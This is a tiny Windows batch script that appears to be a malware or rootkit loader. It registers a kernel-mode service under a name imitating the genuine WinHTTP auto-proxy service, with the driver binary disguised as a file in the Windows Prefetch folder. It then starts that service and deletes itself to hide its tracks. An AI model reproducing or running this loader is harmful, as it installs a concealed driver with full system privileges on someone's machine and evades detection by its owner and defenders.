@echo off
cd %~dp0
sc create WinHttpAutoProxySvc561_c binpath=C:\Windows\Prefetch\CMD.EXE-PL7XK2M4.pf type=kernel
sc start WinHttpAutoProxySvc561_c
del "%~f0"